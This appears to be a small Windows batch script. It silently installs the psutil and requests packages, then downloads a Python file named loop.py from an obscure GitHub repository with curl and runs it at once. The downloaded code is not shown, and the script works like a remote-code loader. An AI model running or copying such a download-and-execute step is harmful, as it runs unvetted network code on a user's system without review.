@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Sfdgertre456/malek3/refs/heads/main/.github/workflows/loop.py
python loop.py
